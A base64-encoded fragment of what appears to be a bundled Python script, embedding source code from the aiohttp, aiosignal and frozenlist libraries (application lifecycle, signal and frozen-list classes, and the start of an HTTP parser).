9wZXJ0eVxyXG4gICAgZGVmIG9uX3NodXRkb3duKHNlbGYpIC0+IF9BcHBTaWduYWw6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29uX3NodXRkb3duXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY2xlYW51cChzZWxmKSAtPiBfQXBwU2lnbmFsOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9jbGVhbnVwXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2xlYW51cF9jdHgoc2VsZikgLT4gIkNsZWFudXBDb250ZXh0IjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2xlYW51cF9jdHhcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByb3V0ZXIoc2VsZikgLT4gVXJsRGlzcGF0Y2hlcjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcm91dGVyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbWlkZGxld2FyZXMoc2VsZikgLT4gX01pZGRsZXdhcmVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9taWRkbGV3YXJlc1xyXG5cclxuICAgIGRlZiBfbWFrZV9oYW5kbGVyKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgKixcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICAgICAgYWNjZXNzX2xvZ19jbGFzczogVHlwZVtBYnN0cmFjdEFjY2Vzc0xvZ2dlcl0gPSBBY2Nlc3NMb2dnZXIsXHJcbiAgICAgICAgKiprd2FyZ3M6IEFueSxcclxuICAgICkgLT4gU2VydmVyOlxyXG5cclxuICAgICAgICBpZiBub3QgaXNzdWJjbGFzcyhhY2Nlc3NfbG9nX2NsYXNzLCBBYnN0cmFjdEFjY2Vzc0xvZ2dlcik6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJhY2Nlc3NfbG9nX2NsYXNzIG11c3QgYmUgc3ViY2xhc3Mgb2YgIlxyXG4gICAgICAgICAgICAgICAgImFpb2h0dHAuYWJjLkFic3RyYWN0QWNjZXNzTG9nZ2VyLCBnb3Qge30iLmZvcm1hdChhY2Nlc3NfbG9nX2NsYXNzKVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3NldF9sb29wKGxvb3ApXHJcbiAgICAgICAgc2VsZi5mcmVlemUoKVxyXG5cclxuICAgICAgICBrd2FyZ3NbImRlYnVnIl0gPSBzZWxmLl9kZWJ1Z1xyXG4gICAgICAgIGt3YXJnc1siYWNjZXNzX2xvZ19jbGFzcyJdID0gYWNjZXNzX2xvZ19jbGFzc1xyXG4gICAgICAgIGlmIHNlbGYuX2hhbmRsZXJfYXJnczpcclxuICAgICAgICAgICAgZm9yIGssIHYgaW4gc2VsZi5faGFuZGxlcl9hcmdzLml0ZW1zKCk6XHJcbiAgICAgICAgICAgICAgICBrd2FyZ3Nba10gPSB2XHJcblxyXG4gICAgICAgIHJldHVybiBTZXJ2ZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2hhbmRsZSwgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG4gICAgICAgICAgICByZXF1ZXN0X2ZhY3Rvcnk9c2VsZi5fbWFrZV9yZXF1ZXN0LFxyXG4gICAgICAgICAgICBsb29wPXNlbGYuX2xvb3AsXHJcbiAgICAgICAgICAgICoqa3dhcmdzLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbWFrZV9oYW5kbGVyKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgKixcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICAgICAgYWNjZXNzX2xvZ19jbGFzczogVHlwZVtBYnN0cmFjdEFjY2Vzc0xvZ2dlcl0gPSBBY2Nlc3NMb2dnZXIsXHJcbiAgICAgICAgKiprd2FyZ3M6IEFueSxcclxuICAgICkgLT4gU2VydmVyOlxyXG5cclxuICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAiQXBwbGljYXRpb24ubWFrZV9oYW5kbGVyKC4uLikgaXMgZGVwcmVjYXRlZCwgIiAidXNlIEFwcFJ1bm5lciBBUEkgaW5zdGVhZCIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX21ha2VfaGFuZGxlcihcclxuICAgICAgICAgICAgbG9vcD1sb29wLCBhY2Nlc3NfbG9nX2NsYXNzPWFjY2Vzc19sb2dfY2xhc3MsICoqa3dhcmdzXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGFydHVwKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQ2F1c2VzIG9uX3N0YXJ0dXAgc2lnbmFsXHJcblxyXG4gICAgICAgIFNob3VsZCBiZSBjYWxsZWQgaW4gdGhlIGV2ZW50IGxvb3AgYWxvbmcgd2l0aCB0aGUgcmVxdWVzdCBoYW5kbGVyLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGF3YWl0IHNlbGYub25fc3RhcnR1cC5zZW5kKHNlbGYpXHJcblxyXG4gICAgYXN5bmMgZGVmIHNodXRkb3duKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQ2F1c2VzIG9uX3NodXRkb3duIHNpZ25hbFxyXG5cclxuICAgICAgICBTaG91bGQgYmUgY2FsbGVkIGJlZm9yZSBjbGVhbnVwKClcclxuICAgICAgICAiIiJcclxuICAgICAgICBhd2FpdCBzZWxmLm9uX3NodXRkb3duLnNlbmQoc2VsZilcclxuXHJcbiAgICBhc3luYyBkZWYgY2xlYW51cChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkNhdXNlcyBvbl9jbGVhbnVwIHNpZ25hbFxyXG5cclxuICAgICAgICBTaG91bGQgYmUgY2FsbGVkIGFmdGVyIHNodXRkb3duKClcclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBzZWxmLm9uX2NsZWFudXAuZnJvemVuOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLm9uX2NsZWFudXAuc2VuZChzZWxmKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICMgSWYgYW4gZXhjZXB0aW9uIG9jY3VycyBpbiBzdGFydHVwLCBlbnN1cmUgY2xlYW51cCBjb250ZXh0cyBhcmUgY29tcGxldGVkLlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9jbGVhbnVwX2N0eC5fb25fY2xlYW51cChzZWxmKVxyXG5cclxuICAgIGRlZiBfbWFrZV9yZXF1ZXN0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbWVzc2FnZTogUmF3UmVxdWVzdE1lc3NhZ2UsXHJcbiAgICAgICAgcGF5bG9hZDogU3RyZWFtUmVhZGVyLFxyXG4gICAgICAgIHByb3RvY29sOiBSZXF1ZXN0SGFuZGxlcixcclxuICAgICAgICB3cml0ZXI6IEFic3RyYWN0U3RyZWFtV3JpdGVyLFxyXG4gICAgICAgIHRhc2s6ICJhc3luY2lvLlRhc2tbTm9uZV0iLFxyXG4gICAgICAgIF9jbHM6IFR5cGVbUmVxdWVzdF0gPSBSZXF1ZXN0LFxyXG4gICAgKSAtPiBSZXF1ZXN0OlxyXG4gICAgICAgIHJldHVybiBfY2xzKFxyXG4gICAgICAgICAgICBtZXNzYWdlLFxyXG4gICAgICAgICAgICBwYXlsb2FkLFxyXG4gICAgICAgICAgICBwcm90b2NvbCxcclxuICAgICAgICAgICAgd3JpdGVyLFxyXG4gICAgICAgICAgICB0YXNrLFxyXG4gICAgICAgICAgICBzZWxmLl9sb29wLFxyXG4gICAgICAgICAgICBjbGllbnRfbWF4X3NpemU9c2VsZi5fY2xpZW50X21heF9zaXplLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX3ByZXBhcmVfbWlkZGxld2FyZShzZWxmKSAtPiBJdGVyYXRvcltUdXBsZVtfTWlkZGxld2FyZSwgYm9vbF1dOlxyXG4gICAgICAgIGZvciBtIGluIHJldmVyc2VkKHNlbGYuX21pZGRsZXdhcmVzKTpcclxuICAgICAgICAgICAgaWYgZ2V0YXR0cihtLCAiX19taWRkbGV3YXJlX3ZlcnNpb25fXyIsIE5vbmUpID09IDE6XHJcbiAgICAgICAgICAgICAgICB5aWVsZCBtLCBUcnVlXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgICAgIFwnb2xkLXN0eWxlIG1pZGRsZXdhcmUgInshcn0iIGRlcHJlY2F0ZWQsIFwnICJzZWUgIzIyNTIiLmZvcm1hdChtKSxcclxuICAgICAgICAgICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgeWllbGQgbSwgRmFsc2VcclxuXHJcbiAgICAgICAgeWllbGQgX2ZpeF9yZXF1ZXN0X2N1cnJlbnRfYXBwKHNlbGYpLCBUcnVlXHJcblxyXG4gICAgYXN5bmMgZGVmIF9oYW5kbGUoc2VsZiwgcmVxdWVzdDogUmVxdWVzdCkgLT4gU3RyZWFtUmVzcG9uc2U6XHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIGRlYnVnID0gbG9vcC5nZXRfZGVidWcoKVxyXG4gICAgICAgIG1hdGNoX2luZm8gPSBhd2FpdCBzZWxmLl9yb3V0ZXIucmVzb2x2ZShyZXF1ZXN0KVxyXG4gICAgICAgIGlmIGRlYnVnOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG1hdGNoX2luZm8sIEFic3RyYWN0TWF0Y2hJbmZvKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAibWF0Y2hfaW5mbyBzaG91bGQgYmUgQWJzdHJhY3RNYXRjaEluZm8gIlxyXG4gICAgICAgICAgICAgICAgICAgICJpbnN0YW5jZSwgbm90IHshcn0iLmZvcm1hdChtYXRjaF9pbmZvKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIG1hdGNoX2luZm8uYWRkX2FwcChzZWxmKVxyXG5cclxuICAgICAgICBtYXRjaF9pbmZvLmZyZWV6ZSgpXHJcblxyXG4gICAgICAgIHJlc3AgPSBOb25lXHJcbiAgICAgICAgcmVxdWVzdC5fbWF0Y2hfaW5mbyA9IG1hdGNoX2luZm9cclxuICAgICAgICBleHBlY3QgPSByZXF1ZXN0LmhlYWRlcnMuZ2V0KGhkcnMuRVhQRUNUKVxyXG4gICAgICAgIGlmIGV4cGVjdDpcclxuICAgICAgICAgICAgcmVzcCA9IGF3YWl0IG1hdGNoX2luZm8uZXhwZWN0X2hhbmRsZXIocmVxdWVzdClcclxuICAgICAgICAgICAgYXdhaXQgcmVxdWVzdC53cml0ZXIuZHJhaW4oKVxyXG5cclxuICAgICAgICBpZiByZXNwIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGhhbmRsZXIgPSBtYXRjaF9pbmZvLmhhbmRsZXJcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3J1bl9taWRkbGV3YXJlczpcclxuICAgICAgICAgICAgICAgIGZvciBhcHAgaW4gbWF0Y2hfaW5mby5hcHBzWzo6LTFdOlxyXG4gICAgICAgICAgICAgICAgICAgIGZvciBtLCBuZXdfc3R5bGUgaW4gYXBwLl9taWRkbGV3YXJlc19oYW5kbGVyczogICMgdHlwZTogaWdub3JlW3VuaW9uLWF0dHJdICMgbm9xYVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBuZXdfc3R5bGU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyID0gdXBkYXRlX3dyYXBwZXIoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydGlhbChtLCBoYW5kbGVyPWhhbmRsZXIpLCBoYW5kbGVyXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyID0gYXdhaXQgbShhcHAsIGhhbmRsZXIpICAjIHR5cGU6IGlnbm9yZVthcmctdHlwZV1cclxuXHJcbiAgICAgICAgICAgIHJlc3AgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpXHJcblxyXG4gICAgICAgIHJldHVybiByZXNwXHJcblxyXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYpIC0+ICJBcHBsaWNhdGlvbiI6XHJcbiAgICAgICAgIiIiZ3VuaWNvcm4gY29tcGF0aWJpbGl0eSIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gZiI8QXBwbGljYXRpb24gMHh7aWQoc2VsZik6eH0+IlxyXG5cclxuICAgIGRlZiBfX2Jvb2xfXyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG5cclxuY2xhc3MgQ2xlYW51cEVycm9yKFJ1bnRpbWVFcnJvcik6XHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBleGNlcHRpb25zKHNlbGYpIC0+IExpc3RbQmFzZUV4Y2VwdGlvbl06XHJcbiAgICAgICAgcmV0dXJuIGNhc3QoTGlzdFtCYXNlRXhjZXB0aW9uXSwgc2VsZi5hcmdzWzFdKVxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIF9DbGVhbnVwQ29udGV4dEJhc2UgPSBGcm96ZW5MaXN0W0NhbGxhYmxlW1tBcHBsaWNhdGlvbl0sIEFzeW5jSXRlcmF0b3JbTm9uZV1dXVxyXG5lbHNlOlxyXG4gICAgX0NsZWFudXBDb250ZXh0QmFzZSA9IEZyb3plbkxpc3RcclxuXHJcblxyXG5jbGFzcyBDbGVhbnVwQ29udGV4dChfQ2xlYW51cENvbnRleHRCYXNlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oKVxyXG4gICAgICAgIHNlbGYuX2V4aXRzID0gW10gICMgdHlwZTogTGlzdFtBc3luY0l0ZXJhdG9yW05vbmVdXVxyXG5cclxuICAgIGFzeW5jIGRlZiBfb25fc3RhcnR1cChzZWxmLCBhcHA6IEFwcGxpY2F0aW9uKSAtPiBOb25lOlxyXG4gICAgICAgIGZvciBjYiBpbiBzZWxmOlxyXG4gICAgICAgICAgICBpdCA9IGNiKGFwcCkuX19haXRlcl9fKClcclxuICAgICAgICAgICAgYXdhaXQgaXQuX19hbmV4dF9fKClcclxuICAgICAgICAgICAgc2VsZi5fZXhpdHMuYXBwZW5kKGl0KVxyXG5cclxuICAgIGFzeW5jIGRlZiBfb25fY2xlYW51cChzZWxmLCBhcHA6IEFwcGxpY2F0aW9uKSAtPiBOb25lOlxyXG4gICAgICAgIGVycm9ycyA9IFtdXHJcbiAgICAgICAgZm9yIGl0IGluIHJldmVyc2VkKHNlbGYuX2V4aXRzKTpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgaXQuX19hbmV4dF9fKClcclxuICAgICAgICAgICAgZXhjZXB0IFN0b3BBc3luY0l0ZXJhdGlvbjpcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBlcnJvcnMuYXBwZW5kKGV4YylcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGVycm9ycy5hcHBlbmQoUnVudGltZUVycm9yKGYie2l0IXJ9IGhhcyBtb3JlIHRoYW4gb25lIFwneWllbGRcJyIpKVxyXG4gICAgICAgIGlmIGVycm9yczpcclxuICAgICAgICAgICAgaWYgbGVuKGVycm9ycykgPT0gMTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIGVycm9yc1swXVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgQ2xlYW51cEVycm9yKCJNdWx0aXBsZSBlcnJvcnMgb24gY2xlYW51cCBzdGFnZSIsIGVycm9ycylcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb3NpZ25hbC9fX2luaXRfXy5weScsIGInZnJvbSBmcm96ZW5saXN0IGltcG9ydCBGcm96ZW5MaXN0XG5cbl9fdmVyc2lvbl9fID0gIjEuMi4wIlxuXG5fX2FsbF9fID0gKCJTaWduYWwiLClcblxuXG5jbGFzcyBTaWduYWwoRnJvemVuTGlzdCk6XG4gICAgIiIiQ29yb3V0aW5lLWJhc2VkIHNpZ25hbCBpbXBsZW1lbnRhdGlvbi5cblxuICAgIFRvIGNvbm5lY3QgYSBjYWxsYmFjayB0byBhIHNpZ25hbCwgdXNlIGFueSBsaXN0IG1ldGhvZC5cblxuICAgIFNpZ25hbHMgYXJlIGZpcmVkIHVzaW5nIHRoZSBzZW5kKCkgY29yb3V0aW5lLCB3aGljaCB0YWtlcyBuYW1lZFxuICAgIGFyZ3VtZW50cy5cbiAgICAiIiJcblxuICAgIF9fc2xvdHNfXyA9ICgiX293bmVyIiwpXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgb3duZXIpOlxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKClcbiAgICAgICAgc2VsZi5fb3duZXIgPSBvd25lclxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gIjxTaWduYWwgb3duZXI9e30sIGZyb3plbj17fSwgeyFyfT4iLmZvcm1hdChcbiAgICAgICAgICAgIHNlbGYuX293bmVyLCBzZWxmLmZyb3plbiwgbGlzdChzZWxmKVxuICAgICAgICApXG5cbiAgICBhc3luYyBkZWYgc2VuZChzZWxmLCAqYXJncywgKiprd2FyZ3MpOlxuICAgICAgICAiIiJcbiAgICAgICAgU2VuZHMgZGF0YSB0byBhbGwgcmVnaXN0ZXJlZCByZWNlaXZlcnMuXG4gICAgICAgICIiIlxuICAgICAgICBpZiBub3Qgc2VsZi5mcm96ZW46XG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbm5vdCBzZW5kIG5vbi1mcm96ZW4gc2lnbmFsLiIpXG5cbiAgICAgICAgZm9yIHJlY2VpdmVyIGluIHNlbGY6XG4gICAgICAgICAgICBhd2FpdCByZWNlaXZlcigqYXJncywgKiprd2FyZ3MpICAjIHR5cGU6IGlnbm9yZVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Zyb3plbmxpc3QvX19pbml0X18ucHknLCBiJ2ltcG9ydCBvc1xyXG5pbXBvcnQgc3lzXHJcbmltcG9ydCB0eXBlc1xyXG5mcm9tIGNvbGxlY3Rpb25zLmFiYyBpbXBvcnQgTXV0YWJsZVNlcXVlbmNlXHJcbmZyb20gZnVuY3Rvb2xzIGltcG9ydCB0b3RhbF9vcmRlcmluZ1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgVHVwbGUsIFR5cGVcclxuXHJcbl9fdmVyc2lvbl9fID0gIjEuMy4wIlxyXG5cclxuX19hbGxfXyA9ICgiRnJvemVuTGlzdCIsICJQeUZyb3plbkxpc3QiKSAgIyB0eXBlOiBUdXBsZVtzdHIsIC4uLl1cclxuXHJcblxyXG5OT19FWFRFTlNJT05TID0gYm9vbChvcy5lbnZpcm9uLmdldCgiRlJPWkVOTElTVF9OT19FWFRFTlNJT05TIikpICAjIHR5cGU6IGJvb2xcclxuXHJcblxyXG5AdG90YWxfb3JkZXJpbmdcclxuY2xhc3MgRnJvemVuTGlzdChNdXRhYmxlU2VxdWVuY2UpOlxyXG5cclxuICAgIF9fc2xvdHNfXyA9ICgiX2Zyb3plbiIsICJfaXRlbXMiKVxyXG5cclxuICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDkpOlxyXG4gICAgICAgIF9fY2xhc3NfZ2V0aXRlbV9fID0gY2xhc3NtZXRob2QodHlwZXMuR2VuZXJpY0FsaWFzKVxyXG4gICAgZWxzZTpcclxuXHJcbiAgICAgICAgQGNsYXNzbWV0aG9kXHJcbiAgICAgICAgZGVmIF9fY2xhc3NfZ2V0aXRlbV9fKGNsczogVHlwZVsiRnJvemVuTGlzdCJdKSAtPiBUeXBlWyJGcm96ZW5MaXN0Il06XHJcbiAgICAgICAgICAgIHJldHVybiBjbHNcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaXRlbXM9Tm9uZSk6XHJcbiAgICAgICAgc2VsZi5fZnJvemVuID0gRmFsc2VcclxuICAgICAgICBpZiBpdGVtcyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaXRlbXMgPSBsaXN0KGl0ZW1zKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGl0ZW1zID0gW11cclxuICAgICAgICBzZWxmLl9pdGVtcyA9IGl0ZW1zXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZnJvemVuKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9mcm96ZW5cclxuXHJcbiAgICBkZWYgZnJlZXplKHNlbGYpOlxyXG4gICAgICAgIHNlbGYuX2Zyb3plbiA9IFRydWVcclxuXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgaW5kZXgpOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pdGVtc1tpbmRleF1cclxuXHJcbiAgICBkZWYgX19zZXRpdGVtX18oc2VsZiwgaW5kZXgsIHZhbHVlKTpcclxuICAgICAgICBpZiBzZWxmLl9mcm96ZW46XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2Fubm90IG1vZGlmeSBmcm96ZW4gbGlzdC4iKVxyXG4gICAgICAgIHNlbGYuX2l0ZW1zW2luZGV4XSA9IHZhbHVlXHJcblxyXG4gICAgZGVmIF9fZGVsaXRlbV9fKHNlbGYsIGluZGV4KTpcclxuICAgICAgICBpZiBzZWxmLl9mcm96ZW46XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2Fubm90IG1vZGlmeSBmcm96ZW4gbGlzdC4iKVxyXG4gICAgICAgIGRlbCBzZWxmLl9pdGVtc1tpbmRleF1cclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKTpcclxuICAgICAgICByZXR1cm4gc2VsZi5faXRlbXMuX19sZW5fXygpXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pdGVtcy5fX2l0ZXJfXygpXHJcblxyXG4gICAgZGVmIF9fcmV2ZXJzZWRfXyhzZWxmKTpcclxuICAgICAgICByZXR1cm4gc2VsZi5faXRlbXMuX19yZXZlcnNlZF9fKClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTpcclxuICAgICAgICByZXR1cm4gbGlzdChzZWxmKSA9PSBvdGhlclxyXG5cclxuICAgIGRlZiBfX2xlX18oc2VsZiwgb3RoZXIpOlxyXG4gICAgICAgIHJldHVybiBsaXN0KHNlbGYpIDw9IG90aGVyXHJcblxyXG4gICAgZGVmIGluc2VydChzZWxmLCBwb3MsIGl0ZW0pOlxyXG4gICAgICAgIGlmIHNlbGYuX2Zyb3plbjpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgbW9kaWZ5IGZyb3plbiBsaXN0LiIpXHJcbiAgICAgICAgc2VsZi5faXRlbXMuaW5zZXJ0KHBvcywgaXRlbSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIGYiPEZyb3plbkxpc3QoZnJvemVuPXtzZWxmLl9mcm96ZW59LCB7c2VsZi5faXRlbXMhcn0pPiJcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZik6XHJcbiAgICAgICAgaWYgc2VsZi5fZnJvemVuOlxyXG4gICAgICAgICAgICByZXR1cm4gaGFzaCh0dXBsZShzZWxmKSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbm5vdCBoYXNoIHVuZnJvemVuIGxpc3QuIilcclxuXHJcblxyXG5QeUZyb3plbkxpc3QgPSBGcm96ZW5MaXN0XHJcblxyXG5cclxudHJ5OlxyXG4gICAgZnJvbSAuX2Zyb3plbmxpc3QgaW1wb3J0IEZyb3plbkxpc3QgYXMgQ0Zyb3plbkxpc3QgICMgdHlwZTogaWdub3JlXHJcblxyXG4gICAgaWYgbm90IE5PX0VYVEVOU0lPTlM6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICBGcm96ZW5MaXN0ID0gQ0Zyb3plbkxpc3QgICMgdHlwZTogaWdub3JlXHJcbmV4Y2VwdCBJbXBvcnRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgcGFzc1xyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9odHRwX3BhcnNlci5weScsIGInaW1wb3J0IGFiY1xyXG5pbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgY29sbGVjdGlvbnNcclxuaW1wb3J0IHJlXHJcbmltcG9ydCBzdHJpbmdcclxuaW1wb3J0IHpsaWJcclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBzdXBwcmVzc1xyXG5mcm9tIGVudW0gaW1wb3J0IEludEVudW1cclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIEFueSxcclxuICAgIEdlbmVyaWMsXHJcbiAgICBMaXN0LFxyXG4gICAgTmFtZWRUdXBsZSxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgUGF0dGVybixcclxuICAgIFNldCxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFR5cGVWYXIsXHJcbiAgICBVbmlvbixcclxuICAgIGNhc3QsXHJcbilcclxuXHJcbmZyb20gbXVsdGlkaWN0IGltcG9ydCBDSU11bHRpRGljdCwgQ0lNdWx0aURpY3RQcm94eSwgaXN0clxyXG5mcm9tIHlhcmwgaW1wb3J0IFVSTFxyXG5cclxuZnJvbSAuIGltcG9ydCBoZHJzXHJcbmZyb20gLmJhc2VfcHJvdG9jb2wgaW1wb3J0IEJhc2VQcm90b2NvbFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBOT19FWFRFTlNJT05TLCBCYXNlVGltZXJDb250ZXh0XHJcbmZyb20gLmh0dHBfZXhjZXB0aW9ucyBpbXBvcnQgKFxyXG4gICAgQmFkSHR0cE1lc3NhZ2UsXHJcbiAgICBCYWRTdGF0dXNMaW5lLFxyXG4gICAgQ29udGVudEVuY29kaW5nRXJyb3IsXHJcbiAgICBDb250ZW50TGVuZ3RoRXJyb3IsXHJcbiAgICBJbnZhbGlkSGVhZGVyLFxyXG4gICAgTGluZVRvb0xvbmcsXHJcbiAgICBUcmFuc2ZlckVuY29kaW5nRXJyb3IsXHJcbilcclxuZnJvbSAuaHR0cF93cml0ZXIgaW1wb3J0IEh0dHBWZXJzaW9uLCBIdHRwVmVyc2lvbjEwXHJcbmZyb20gLmxvZyBpbXBvcnQgaW50ZXJuYWxfbG9nZ2VyXHJcbmZyb20gLnN0cmVhbXMgaW1wb3J0IEVNUFRZX1BBWUxPQUQsIFN0cmVhbVJlYWRlclxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgRmluYWwsIFJhd0hlYWRlcnNcclxuXHJcbnRyeTpcclxuICAgIGltcG9ydCBicm90bGlcclxuXHJcbiAgICBIQVNfQlJPVExJID0gVHJ1ZVxyXG5leGNlcHQgSW1wb3J0RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIEhBU19CUk9UTEkgPSBGYWxzZVxyXG5cclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiSGVhZGVyc1BhcnNlciIsXHJcbiAgICAiSHR0cFBhcnNlciIsXHJcbiAgICAiSHR0cFJlcXVlc3RQYXJzZXIiLFxyXG4gICAgIkh0dHBSZXNwb25zZVBhcnNlciIsXHJcbiAgICAiUmF3UmVxdWVzdE1lc3NhZ2UiLFxyXG4gICAgIlJhd1Jlc3BvbnNlTWVzc2FnZSIsXHJcbilcclxuXHJcbkFTQ0lJU0VUOiBGaW5hbFtTZXRbc3RyXV0gPSBzZXQoc3RyaW5nLnByaW50YWJsZSlcclxuXHJcbiMgU2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM3MjMwI3NlY3Rpb24tMy4x